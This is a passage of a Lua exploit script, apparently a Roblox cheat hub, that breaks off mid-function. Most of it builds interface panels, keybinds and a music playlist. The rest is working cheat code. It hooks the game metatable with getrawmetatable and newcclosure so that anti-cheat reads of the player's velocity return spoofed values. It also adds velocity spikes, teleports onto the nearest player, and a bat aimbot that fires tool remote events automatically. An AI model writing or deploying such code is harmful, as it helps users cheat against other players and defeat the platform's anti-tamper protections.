    minus.Size = UDim2.new(0, 28, 0, 24)
    minus.Position = UDim2.new(1, -112, 0.5, -12)
    minus.BackgroundColor3 = C.panel
    minus.BackgroundTransparency = 0.15
    minus.BorderSizePixel = 0
    minus.Text = "-"
    minus.TextColor3 = C.text
    minus.Font = Enum.Font.GothamBlack
    minus.TextSize = 14
    minus.AutoButtonColor = false
    minus.ZIndex = 8
    mkCorner(minus, 6)
    mkStroke(minus, C.border, 1)

    local valueBox = Instance.new("TextLabel", row)
    valueBox.Size = UDim2.new(0, 48, 0, 24)
    valueBox.Position = UDim2.new(1, -80, 0.5, -12)
    valueBox.BackgroundColor3 = C.panel
    valueBox.BackgroundTransparency = 0.1
    valueBox.BorderSizePixel = 0
    valueBox.Text = string.format("%.2f", value)
    valueBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    valueBox.TextTransparency = 0
    valueBox.Font = Enum.Font.GothamBlack
    valueBox.TextSize = 13
    valueBox.ZIndex = 8
    mkCorner(valueBox, 6)
    mkStroke(valueBox, C.border, 1)

    local plus = Instance.new("TextButton", row)
    plus.Size = UDim2.new(0, 28, 0, 24)
    plus.Position = UDim2.new(1, -28, 0.5, -12)
    plus.BackgroundColor3 = C.panel
    plus.BackgroundTransparency = 0.15
    plus.BorderSizePixel = 0
    plus.Text = "+"
    plus.TextColor3 = C.text
    plus.Font = Enum.Font.GothamBlack
    plus.TextSize = 14
    plus.AutoButtonColor = false
    plus.ZIndex = 8
    mkCorner(plus, 6)
    mkStroke(plus, C.border, 1)

    local function setValue(nextValue)
        value = math.clamp(math.floor(nextValue * 100 + 0.5) / 100, 0.50, 1.50)
        valueBox.Text = string.format("%.2f", value)
        onChanged(value)
        task.spawn(saveConfig)
    end
    minus.MouseButton1Click:Connect(function() setValue(value - 0.05) end)
    plus.MouseButton1Click:Connect(function() setValue(value + 0.05) end)
end

makeGuiScaleStepper("GUI Scale", State.uiScale, function(value)
    State.uiScale = value
    if mainUiScale then mainUiScale.Scale = value end
end)

makeGuiScaleStepper("Progress Bar Size", State.progressBarScale, function(value)
    State.progressBarScale = value
    applyMiseryProgressBarScale()
end)

makeGuiScaleStepper("Lagger UI Scale", State.laggerUiScale, function(value)
    State.laggerUiScale = value
    if _G.BlastApplyLaggerScale then _G.BlastApplyLaggerScale() end
end)

makeLine(tabVis)

makeSectionHeader("MOBILE", tabVis)
toggleRefs.hideMobileButtons = makeToggleRow("Mobile Buttons", not State.hideMobileButtons, function(on, isSync)
    State.hideMobileButtons = not on
    _G._VezyHideSideBtns = not on
    if mobileButtonsGui then mobileButtonsGui.Enabled = on end
    if mobileButtons then
        for _, btnData in pairs(mobileButtons) do
            if btnData.holder then btnData.holder.Visible = on end
            if btnData.btn then btnData.btn.Visible = on end
        end
    end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)
toggleRefs.lockMobileButtons = makeToggleRow("Lock UI Mobile Buttons", State.lockMobileButtons, function(on, isSync)
    State.lockMobileButtons = on
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)
makeLine(tabVis)
makeSectionHeader("INTRO", tabVis)

-- Intro (ligar/desligar)
toggleRefs.intro = makeToggleRow("Intro", INTRO.enabled, function(on, isSync)
    INTRO.enabled = on
    if not on then INTRO.stopPlayback(); INTRO.stopPreview() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabVis)

-- Intro Song (cicla as músicas e toca preview)
do
    local row = Instance.new("Frame", tabVis)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.05
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    mkCorner(row, 9)
    mkStroke(row, C.border, 1.15, 0.38)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(1, -140, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "Intro Song (10s)"
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextTransparency = 0
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.ZIndex = 5

    local songBtn = Instance.new("TextButton", row)
    songBtn.Size = UDim2.new(0, 118, 0, 28)
    songBtn.Position = UDim2.new(1, -128, 0.5, -14)
    songBtn.BackgroundColor3 = C.panel
    songBtn.BackgroundTransparency = 0.18
    songBtn.BorderSizePixel = 0
    songBtn.Text = INTRO.getSongName()
    songBtn.TextColor3 = C.text
    songBtn.Font = Enum.Font.GothamBlack
    songBtn.TextSize = 12
    songBtn.AutoButtonColor = false
    songBtn.ZIndex = 6
    mkCorner(songBtn, 8)
    mkStroke(songBtn, Color3.fromRGB(255,255,255), 1)

    local function updateSongBtn()
        if songBtn and songBtn.Parent then
            songBtn.Text = INTRO.getSongName()
            songBtn.TextColor3 = C.text
        end
    end

    songBtn.MouseButton1Click:Connect(function()
        INTRO.music = INTRO.music + 1
        if INTRO.music > #INTRO.OPTIONS then INTRO.music = 1 end
        updateSongBtn()
        INTRO.preview(INTRO.music)
        task.spawn(saveConfig)
    end)
end

makeSectionHeader("PLAYLIST", tabVis)
local function _buildPlaylist()
    local ui = {rows = {}}
    _G.BlastMatchUI = ui

    local player = Instance.new("Frame", tabVis)
    player.Name = "MatchPlayer"
    player.Size = UDim2.new(1, 0, 0, 58)
    player.BackgroundColor3 = Color3.fromRGB(4, 4, 7)
    player.BackgroundTransparency = 0.02
    player.BorderSizePixel = 0
    player.LayoutOrder = LO()
    player.ZIndex = 7
    mkCorner(player, 10)
    mkStroke(player, Color3.fromRGB(220, 220, 225), 1.2, 0.22)

    local prevBtn = Instance.new("TextButton", player)
    prevBtn.Size = UDim2.new(0, 28, 0, 28)
    prevBtn.Position = UDim2.new(0, 10, 0.5, -14)
    prevBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    prevBtn.BorderSizePixel = 0
    prevBtn.Text = "<"
    prevBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    prevBtn.Font = Enum.Font.GothamBlack
    prevBtn.TextSize = 14
    prevBtn.AutoButtonColor = false
    prevBtn.ZIndex = 8
    mkCorner(prevBtn, 8)

    local playBtn = Instance.new("TextButton", player)
    playBtn.Size = UDim2.new(0, 36, 0, 36)
    playBtn.Position = UDim2.new(0, 42, 0.5, -18)
    playBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 248)
    playBtn.BorderSizePixel = 0
    playBtn.Text = ">"
    playBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    playBtn.Font = Enum.Font.GothamBlack
    playBtn.TextSize = 16
    playBtn.AutoButtonColor = false
    playBtn.ZIndex = 8
    mkCorner(playBtn, 18)

    local nextBtn = Instance.new("TextButton", player)
    nextBtn.Size = UDim2.new(0, 28, 0, 28)
    nextBtn.Position = UDim2.new(0, 82, 0.5, -14)
    nextBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    nextBtn.BorderSizePixel = 0
    nextBtn.Text = ">"
    nextBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    nextBtn.Font = Enum.Font.GothamBlack
    nextBtn.TextSize = 14
    nextBtn.AutoButtonColor = false
    nextBtn.ZIndex = 8
    mkCorner(nextBtn, 8)

    local nowTag = Instance.new("TextLabel", player)
    nowTag.Size = UDim2.new(1, -128, 0, 14)
    nowTag.Position = UDim2.new(0, 118, 0, 10)
    nowTag.BackgroundTransparency = 1
    nowTag.Text = "NOW PLAYING"
    nowTag.TextColor3 = Color3.fromRGB(170, 170, 178)
    nowTag.Font = Enum.Font.GothamBold
    nowTag.TextSize = 9
    nowTag.TextXAlignment = Enum.TextXAlignment.Left
    nowTag.ZIndex = 8

    local nowName = Instance.new("TextLabel", player)
    nowName.Size = UDim2.new(1, -128, 0, 20)
    nowName.Position = UDim2.new(0, 118, 0, 24)
    nowName.BackgroundTransparency = 1
    nowName.Text = "Song 1"
    nowName.TextColor3 = Color3.fromRGB(255, 255, 255)
    nowName.Font = Enum.Font.GothamBlack
    nowName.TextSize = 14
    nowName.TextXAlignment = Enum.TextXAlignment.Left
    nowName.ZIndex = 8

    local list = Instance.new("Frame", tabVis)
    list.Name = "MatchPlaylist"
    list.Size = UDim2.new(1, 0, 0, 4 + #INTRO.MATCH_OPTIONS * 34)
    list.BackgroundColor3 = Color3.fromRGB(6, 6, 9)
    list.BackgroundTransparency = 0.04
    list.BorderSizePixel = 0
    list.LayoutOrder = LO()
    list.ZIndex = 7
    mkCorner(list, 10)
    mkStroke(list, C.border, 1.1, 0.35)

    local function totalSongs()
        return (INTRO.MATCH_OPTIONS and #INTRO.MATCH_OPTIONS) or 2
    end

    local function selectSong(index, andPlay)
        INTRO.matchMusic = index
        if andPlay or INTRO.matchEnabled then
            INTRO.matchEnabled = true
            INTRO.playMatch()
        end
        if ui.refresh then ui.refresh() end
        task.spawn(saveConfig)
    end

    ui.refresh = function()
        local playing = INTRO.matchEnabled == true
        playBtn.Text = playing and "||" or ">"
        playBtn.BackgroundColor3 = playing and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(232, 232, 238)
        nowTag.Text = playing and "NOW PLAYING" or "PAUSED"
        nowName.Text = INTRO.getMatchSongName and INTRO.getMatchSongName() or "Song 1"
        for index, row in ipairs(ui.rows) do
            local active = index == (INTRO.matchMusic or 1)
            row.num.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 158)
            row.name.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(210, 210, 216)
            row.icon.Text = (active and playing) and "||" or ">"
            row.icon.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(160, 160, 168)
            row.bg.BackgroundColor3 = active and Color3.fromRGB(48, 48, 54) or Color3.fromRGB(42, 42, 48)
            row.bg.BackgroundTransparency = active and 0.05 or 1
        end
    end

    for i = 1, #INTRO.MATCH_OPTIONS do
        local track = Instance.new("TextButton", list)
        track.Size = UDim2.new(1, -8, 0, 32)
        track.Position = UDim2.new(0, 4, 0, 4 + (i - 1) * 34)
        track.BackgroundColor3 = Color3.fromRGB(42, 42, 48)
        track.BackgroundTransparency = 1
        track.BorderSizePixel = 0
        track.Text = ""
        track.AutoButtonColor = false
        track.ZIndex = 8
        mkCorner(track, 7)

        local num = Instance.new("TextLabel", track)
        num.Size = UDim2.new(0, 28, 1, 0)
        num.Position = UDim2.new(0, 6, 0, 0)
        num.BackgroundTransparency = 1
        num.Text = (i < 10 and "0" or "") .. tostring(i)
        num.TextColor3 = Color3.fromRGB(150, 150, 158)
        num.Font = Enum.Font.GothamBold
        num.TextSize = 11
        num.TextXAlignment = Enum.TextXAlignment.Left
        num.ZIndex = 9

        local name = Instance.new("TextLabel", track)
        name.Size = UDim2.new(1, -70, 1, 0)
        name.Position = UDim2.new(0, 34, 0, 0)
        name.BackgroundTransparency = 1
        name.Text = (INTRO.MATCH_OPTIONS and INTRO.MATCH_OPTIONS[i] and INTRO.MATCH_OPTIONS[i].name) or ("Song " .. i)
        name.TextColor3 = Color3.fromRGB(210, 210, 216)
        name.Font = Enum.Font.GothamBlack
        name.TextSize = 12
        name.TextXAlignment = Enum.TextXAlignment.Left
        name.ZIndex = 9

        local icon = Instance.new("TextLabel", track)
        icon.Size = UDim2.new(0, 22, 1, 0)
        icon.Position = UDim2.new(1, -28, 0, 0)
        icon.BackgroundTransparency = 1
        icon.Text = ">"
        icon.TextColor3 = Color3.fromRGB(160, 160, 168)
        icon.Font = Enum.Font.GothamBlack
        icon.TextSize = 12
        icon.ZIndex = 9

        ui.rows[i] = {bg = track, num = num, name = name, icon = icon}
        local songIndex = i
        track.MouseButton1Click:Connect(function()
            selectSong(songIndex, true)
        end)
    end

    playBtn.MouseButton1Click:Connect(function()
        INTRO.matchEnabled = not INTRO.matchEnabled
        if INTRO.matchEnabled then INTRO.playMatch() else INTRO.stopMatch() end
        ui.refresh()
        task.spawn(saveConfig)
    end)
    prevBtn.MouseButton1Click:Connect(function()
        local n = totalSongs()
        selectSong(((INTRO.matchMusic or 1) - 2) % n + 1, INTRO.matchEnabled)
    end)
    nextBtn.MouseButton1Click:Connect(function()
        local n = totalSongs()
        selectSong(((INTRO.matchMusic or 1) % n) + 1, INTRO.matchEnabled)
    end)

    toggleRefs.matchMusic = function(on, isSync)
        INTRO.matchEnabled = on == true
        if INTRO.matchEnabled then INTRO.playMatch() else INTRO.stopMatch() end
        ui.refresh()
        if not isSync then task.spawn(saveConfig) end
    end

    ui.refresh()
end
_buildPlaylist()

-- KEYBINDS tab (same action callbacks used by keyboard and gamepad)
do
local registry = _G.EmbeerKeybinds
local function aimbotOn(mode)
    return State.batAimbotToggled == true and (State.aimbotMode or "normal") == mode
end
local function setAimbot(mode, on)
    stopBatAimbot()
    State.aimbotMode = mode
    State.batAimbotToggled = on
    if on then
        if State.autoLeftEnabled then State.autoLeftEnabled = false; stopAutoLeft() end
        if State.autoRightEnabled then State.autoRightEnabled = false; stopAutoRight() end
        if toggleRefs.autoLeft then toggleRefs.autoLeft(State.autoLeftEnabled, true) end
        if toggleRefs.autoRight then toggleRefs.autoRight(State.autoRightEnabled, true) end
    end
    if toggleRefs.aimbot then toggleRefs.aimbot(on, true)
    elseif on then startBatAimbot() end
    if mobileButtons.batAimbot then mobileButtons.batAimbot.setActive(aimbotOn("normal")) end
    if mobileButtons.batBypass then mobileButtons.batBypass.setActive(aimbotOn("antiBatBypass")) end
    task.spawn(saveConfig)
end
registry.actions = {
    drop = {label = "Drop Brainrot", get = function() return DROP.active end,
        set = function(on) if on then runDropBrainrot() else stopDropBrainrot() end end},
    aimbot = {label = "Bat Aimbot", get = function() return aimbotOn("normal") end,
        set = function(on) setAimbot("normal", on) end},
    tpDown = {label = "Tp Down", get = function() return registry.tpDownActive end,
        set = function(on)
            registry.tpDownActive = on
            if on then doTpDown(); task.delay(0.16, function() registry.tpDownActive = false end) end
        end},
    carry = {label = "Carry Spd", get = function() return SPD.speedMode == true and not SPD.laggerToggled end,
        set = function(on)
            if on or SPD.speedMode then SPD.toggleCarryMode() end
        end},
    lagger = {label = "Lagger Toggle", get = function() return SPD.isLaggerNormalOn() end,
        set = function(on)
            -- Alterna: Lagger Mode -> Lagger Carry -> Lagger Mode ...
            if on then SPD.setLaggerNormal(true) else SPD.setLaggerCarry(true) end
        end},
    batBypass = {label = "Bat Bypass", get = function() return aimbotOn("antiBatBypass") end,
        set = function(on) setAimbot("antiBatBypass", on) end},
    batT = {label = "Bat T", get = function() return State.snowTpBatEnabled == true end,
        set = function(on)
            if toggleRefs.snowTpBat then toggleRefs.snowTpBat(on)
            elseif _G.BlastSnowTpSet then _G.BlastSnowTpSet(on) end
        end},
}
function registry.trigger(key)
    local action = registry.actions[key]
    if not action then return end
    action.set(not action.get())
end
loCount = 0
makeSectionHeader("KEYBINDS", tabKeybinds)
for _, key in ipairs({"drop", "aimbot", "tpDown", "carry", "lagger", "batBypass", "batT"}) do
    local action = registry.actions[key]
    local row = Instance.new("Frame", tabKeybinds)
    row.Name = "Keybind_" .. key
    row.Size = UDim2.new(1, 0, 0, 44)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.6
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 8
    styleXzzRow(row)
    local label = Instance.new("TextLabel", row)
    label.Position = UDim2.new(0, 12, 0, 0)
    label.Size = UDim2.new(1, -108, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = action.label
    label.Font = Enum.Font.GothamBlack
    label.TextSize = 12
    label.TextColor3 = C.text
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextTruncate = Enum.TextTruncate.AtEnd
    label.ZIndex = 9
    local switch = Instance.new("TextButton", row)
    switch.Name = "Toggle"
    switch.Size = UDim2.new(0, 34, 0, 20)
    switch.Position = UDim2.new(1, -88, 0.5, -10)
    switch.Text = ""
    switch.BorderSizePixel = 0
    switch.AutoButtonColor = false
    switch.BackgroundColor3 = C.pillOff
    switch.ZIndex = 10
    mkCorner(switch, 10)
    mkStroke(switch, C.accent, 1, 0.2)
    local dot = Instance.new("Frame", switch)
    dot.Size = UDim2.new(0, 14, 0, 14)
    dot.Position = UDim2.new(0, 3, 0.5, -7)
    dot.BackgroundColor3 = C.text
    dot.BorderSizePixel = 0
    dot.ZIndex = 11
    mkCorner(dot, 7)
    switch.MouseButton1Click:Connect(function() registry.trigger(key) end)
    local btn = Instance.new("TextButton", row)
    btn.Name = "Key"
    btn.Size = UDim2.new(0, 32, 0, 32)
    btn.Position = UDim2.new(1, -42, 0.5, -16)
    btn.BackgroundColor3 = C.panel
    btn.BackgroundTransparency = 0.15
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.Text = getKeyName(Keys[key])
    btn.Font = Enum.Font.GothamBlack
    btn.TextColor3 = C.accent
    btn.TextSize = 10
    btn.TextScaled = true
    btn.TextWrapped = true
    btn.ZIndex = 10
    mkCorner(btn, 6)
    mkStroke(btn, C.accent, 1.5, 0.1)
    local pad = Instance.new("UIPadding", btn)
    pad.PaddingLeft = UDim.new(0, 3); pad.PaddingRight = UDim.new(0, 3)
    local limit = Instance.new("UITextSizeConstraint", btn)
    limit.MinTextSize = 6; limit.MaxTextSize = 11
    registry.buttons[key] = registry.buttons[key] or {}
    table.insert(registry.buttons[key], btn)
    btn.MouseButton1Click:Connect(function()
        if activeKeybindKeyRef == key and activeKeybindBtn == btn then cancelActiveKeybind(); return end
        cancelActiveKeybind()
        activeKeybindBtn = btn; activeKeybindKeyRef = key; btn.Text = "..."
        registry.capture(btn, key)
    end)
    registry.rows[key] = function()
        local on = action.get() == true
        switch.BackgroundColor3 = on and C.pillOn or C.pillOff
        dot.Position = on and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
    end
    registry.rows[key]()
end
local elapsed = 0
trackConn(RunService.Heartbeat:Connect(function(dt)
    elapsed = elapsed + dt
    if elapsed < 0.1 then return end
    elapsed = 0
    for _, paint in pairs(registry.rows) do paint() end
    registry.refreshKeys()
end))
end

end


-- ============================================================
-- ANTI BAT (Blast engine; VLESSVS Hub interface)
-- ============================================================
(function()
    -- ANTI DROP (always on — required for velocity anti-bat)
    if not _G._BlastUT6AntiDropInstalled then
        local mt = getrawmetatable(game)
        local oldIdx, oldNewIdx
        local spoofedVelocity = Vector3.zero
        local antiDropActive = false

        local function startAntiDrop()
            if antiDropActive or not mt then return end
            oldIdx = mt.__index
            oldNewIdx = mt.__newindex
            setreadonly(mt, false)

            mt.__index = newcclosure(function(self, key)
                if not checkcaller() and (key == "AssemblyLinearVelocity" or key == "Velocity")
                    and typeof(self) == "Instance" and self:IsA("BasePart")
                    and self.Name == "HumanoidRootPart" and LP.Character
                    and self:IsDescendantOf(LP.Character) then
                    return spoofedVelocity
                end
                return oldIdx(self, key)
            end)

            mt.__newindex = newcclosure(function(self, key, value)
                if not checkcaller() and (key == "AssemblyLinearVelocity" or key == "Velocity")
                    and typeof(self) == "Instance" and self:IsA("BasePart")
                    and self.Name == "HumanoidRootPart" and LP.Character
                    and self:IsDescendantOf(LP.Character) then
                    spoofedVelocity = value
                    return
                end
                return oldNewIdx(self, key, value)
            end)

            setreadonly(mt, true)
            antiDropActive = true
        end

        startAntiDrop()
        LP.CharacterAdded:Connect(function()
            task.wait(0.1)
            if not antiDropActive then startAntiDrop() end
        end)
        _G._BlastUT6AntiDropInstalled = true
    end

    -- ANTI BAT CORE (velocity spike)
    local AntiBatConn = nil
    local Speed = 10000
    local Angle = 0
    local Direction = 1

    local function abStop()
        State.antiBatEnabled = false
        if AntiBatConn then
            pcall(function() AntiBatConn:Disconnect() end)
            AntiBatConn = nil
        end
        Speed = 10000
        Angle = 0
        Direction = 1
        _G._AmbitiousAntiBatDesiredXZ = nil
        _G._AmbitiousAntiBatSpiking = false
        _G.UT6DuelsAntiBatEnabled = false
    end

    local function abStart()
        abStop()
        State.antiBatEnabled = true
        _G.UT6DuelsAntiBatEnabled = true
        AntiBatConn = RunService.Heartbeat:Connect(function()
            if not State.antiBatEnabled then return end
            local char = LP.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root or not root.Parent then return end

            local origXZ = Vector3.new(root.Velocity.X, 0, root.Velocity.Z)

            Speed = Speed + (50 * Direction)
            if Speed >= 20000 then
                Speed = 20000
                Direction = -1
            elseif Speed <= 10000 then
                Speed = 10000
                Direction = 1
            end

            Angle = Angle + (math.random() * 0.5)
            local radius = Speed + math.random(-5000, 5000)
            local newX = math.cos(Angle) * radius
            local newZ = math.sin(Angle) * radius

            _G._AmbitiousAntiBatSpiking = true
            root.Velocity = Vector3.new(newX, root.Velocity.Y, newZ)

            RunService.RenderStepped:Wait()

            if root.Parent then
                local want = _G._AmbitiousAntiBatDesiredXZ
                if want then
                    root.Velocity = Vector3.new(want.X, root.Velocity.Y, want.Z)
                else
                    root.Velocity = Vector3.new(origXZ.X, root.Velocity.Y, origXZ.Z)
                end
            end
            _G._AmbitiousAntiBatSpiking = false
        end)
    end

    function startAntiBatSpoof()
        abStart()
    end
    function stopAntiBatSpoof()
        abStop()
    end
    function toggleAntiBatSpoof()
        if State.antiBatEnabled then abStop() else abStart() end
        return State.antiBatEnabled
    end

    _G.BlastStartAntiBatSpoof = abStart
    _G.BlastStopAntiBatSpoof = abStop
    _G.BlastToggleAntiBatSpoof = toggleAntiBatSpoof

    _G.UT6DuelsAntiBat = {
        setEnabled = function(on)
            if on then abStart() else abStop() end
        end,
        isEnabled = function()
            return State.antiBatEnabled == true
        end,
    }

    task.spawn(function()
        while true do
            task.wait(0.5)
            if State.antiBatEnabled then
                if not AntiBatConn then pcall(abStart) end
            elseif AntiBatConn then
                pcall(abStop)
            end
        end
    end)

    LP.CharacterAdded:Connect(function()
        if State.antiBatEnabled then
            task.wait(0.15)
            abStart()
        end
    end)

    if State.antiBatEnabled then task.defer(abStart) end
end)()

-- ============================================================
-- CORE FUNCTIONS
-- ============================================================
do

-- TP Down (Clean Hub Duel — full replacement, no Blast reuse)
doTpDown = function()
    pcall(function()
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        root.CFrame = CFrame.new(root.Position.X, -7, root.Position.Z)
            * CFrame.Angles(0, select(2, root.CFrame:ToEulerAnglesYXZ()), 0)
        root.Velocity = Vector3.zero
    end)
end



stopDropBrainrot = function()
    DROP.active = false
    if DROP._conn then DROP._conn:Disconnect(); DROP._conn = nil end
    for _, t in ipairs(DROP.conns) do
        if type(t) == "thread" then pcall(task.cancel, t)
        elseif type(t) == "RBXScriptConnection" then pcall(t.Disconnect, t) end
    end
    DROP.conns = {}
    local c = LP.Character
    if c then
        local root = c:FindFirstChild("HumanoidRootPart")
        if root then root.AssemblyLinearVelocity = Vector3.zero end
    end
    if DROP.setVisual then DROP.setVisual(false) end
    if DROP.mobSet then DROP.mobSet(false) end
end

runDropBrainrot = function()
    if DROP.active then return end
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not hum then return end


    -- ================= JUMP DROP MODE (Night Hub) =================
    DROP.active = true
    if DROP.setVisual then DROP.setVisual(true) end
    if DROP.mobSet then DROP.mobSet(true) end
    local t0 = tick()
    if DROP._conn then DROP._conn:Disconnect() end
    DROP._conn = RunService.Heartbeat:Connect(function()
        local c = LP.Character
        local r = c and c:FindFirstChild("HumanoidRootPart")
        if not r then
            if DROP._conn then DROP._conn:Disconnect(); DROP._conn = nil end
            DROP.active = false
            if DROP.setVisual then DROP.setVisual(false) end
            if DROP.mobSet then DROP.mobSet(false) end
            return
        end
        if not DROP.active then
            if DROP._conn then DROP._conn:Disconnect(); DROP._conn = nil end
            if DROP.setVisual then DROP.setVisual(false) end
            if DROP.mobSet then DROP.mobSet(false) end
            return
        end
        if tick() - t0 >= DROP.ascendDuration then
            if DROP._conn then DROP._conn:Disconnect(); DROP._conn = nil end
            pcall(function()
                local hum2 = c:FindFirstChildOfClass("Humanoid")
                local rp = RaycastParams.new()
                rp.FilterDescendantsInstances = {c}
                rp.FilterType = Enum.RaycastFilterType.Exclude
                local rr = workspace:Raycast(r.Position, Vector3.new(0, -3000, 0), rp)
                if rr then
                    local off = ((hum2 and hum2.HipHeight) or 2) + (r.Size.Y / 2)
                    r.CFrame = CFrame.new(r.Position.X, rr.Position.Y + off, r.Position.Z)
                    r.AssemblyLinearVelocity = Vector3.zero
                    r.AssemblyAngularVelocity = Vector3.zero
                end
                if hum2 and hum2.Health > 0 then hum2:ChangeState(Enum.HumanoidStateType.Running) end
            end)
            DROP.active = false
            if DROP.setVisual then DROP.setVisual(false) end
            if DROP.mobSet then DROP.mobSet(false) end
            return
        end
        local lv = r.AssemblyLinearVelocity
        r.AssemblyLinearVelocity = Vector3.new(lv.X, DROP.ascendSpeed, lv.Z)
    end)
end




-- Aimbot (Envy/Opium style)
local _aimbotTarget = nil

local function findAnyTool()
    local c = LP.Character
    if c then for _, v in ipairs(c:GetChildren()) do if v:IsA("Tool") then return v end end end
    local bp = LP:FindFirstChildOfClass("Backpack")
    if bp then for _, v in ipairs(bp:GetChildren()) do if v:IsA("Tool") then return v end end end
    return nil
end

local BAT_SLAP_LIST={"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
local function findBat()
    local char=LP.Character;if not char then return nil end
    for _,name in ipairs(BAT_SLAP_LIST) do
        local t=char:FindFirstChild(name)
        if t and t:IsA("Tool") then return t end
    end
    local bp=LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _,name in ipairs(BAT_SLAP_LIST) do
            local t=bp:FindFirstChild(name)
            if t and t:IsA("Tool") then return t end
        end
    end
    for _,ch in ipairs(char:GetChildren()) do
        if ch:IsA("Tool") and (ch.Name:lower():find("bat") or ch.Name:lower():find("slap")) then return ch end
    end
    return nil
end
local function swingCurrentBat()
    if not State.autoSwingEnabled then return end
    local bat=findBat()
    if bat and bat.Parent==LP.Character and bat:IsA("Tool") then pcall(function() bat:Activate() end) end
end
local function trySwing()
    if not State.autoSwingEnabled then return end
    local bat=findBat()
    if bat and bat.Parent==LP.Character and bat:IsA("Tool") then pcall(function() bat:Activate() end) end
end

local function getClosestTarget()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil, math.huge end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then minDist = dist; closest = tRoot end
            end
        end
    end
    return closest, minDist
end

local tpBatConn = nil
function startTpBat()
    if tpBatConn then return end
    tpBatConn = RunService.Heartbeat:Connect(function()
        if not State.tpBatEnabled then return end
        
        local char = LP.Character
        if not char then return end
        
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local target = getClosestTarget()
        if target then
            local pos = target.Position + Vector3.new(0, 3, 0)
            if _G._BlastTpBatLeanCFrame then
                root.CFrame = _G._BlastTpBatLeanCFrame(pos, target)
            else
                root.CFrame = CFrame.new(pos)
            end
        end
    end)
end

function stopTpBat()
    if tpBatConn then
        tpBatConn:Disconnect()
        tpBatConn = nil
    end
end

-- Vision Bat Functions
local function getBat()
    local char = LP.Character
    if not char then return nil end
    local tool = char:FindFirstChild("Bat")
    if tool then return tool end
    local bp2 = LP:FindFirstChild("Backpack")
    if bp2 then
        tool = bp2:FindFirstChild("Bat")
        if tool then tool.Parent = char; return tool end
    end
    return nil
end

tryHitVisionBat = function()
    if State.hittingCooldown then return end
    State.hittingCooldown = true
    pcall(function()
        local bat = getBat()
        if bat then
            bat:Activate()
            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then ev:FireServer() end
        end
    end)
    task.delay(0.08, function() State.hittingCooldown = false end)
end

getClosestPlayer = function()
    if not hrp then return nil, math.huge end
    local cp, cd = nil, math.huge
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local tr = p.Character:FindFirstChild("HumanoidRootPart")
            if tr then
                local d = (hrp.Position - tr.Position).Magnitude
                if d < cd then cd = d; cp = p end
            end
        end
    end
    return cp, cd
end

local function tryHitBat()
    if State.hittingCooldown then return end
    State.hittingCooldown = true
    pcall(function()
        local c = LP.Character; if not c then return end
        local hum2 = c:FindFirstChildOfClass("Humanoid")
        local tool = findAnyTool()
        if tool then
            if tool.Parent ~= c and hum2 then pcall(function() hum2:EquipTool(tool) end) end
            local remote = tool:FindFirstChildOfClass("RemoteEvent")
            if remote then pcall(function() remote:FireServer() end)
            else pcall(function() tool:Activate() end) end
        end
    end)
    task.delay(State.SwingCooldown, function() State.hittingCooldown = false end)
end

do
local engine = {path = {}, lock = {target = nil}, swingCooldown = false, generation = 0}
_G.EmbeerMysteryBat = engine
function engine.holdingBrainrot()
    local okA, vA = pcall(function() return LP:GetAttribute("Stealing") end)
    if okA and vA == true then return true end
    local okB, vB = pcall(function() return LP:GetAttribute("AntiKick") end)
    if okB and vB == true then return true end
    local char = LP.Character; if not char then return false end
    local okC, vC = pcall(function() return char:GetAttribute("Stealing") end)
    if okC and vC == true then return true end
    for _, name in ipairs({"Carrying","IsCarrying","Grabbed","Holding","StealHold","HasGrab"}) do
        local v = char:FindFirstChild(name, true)
        if v then
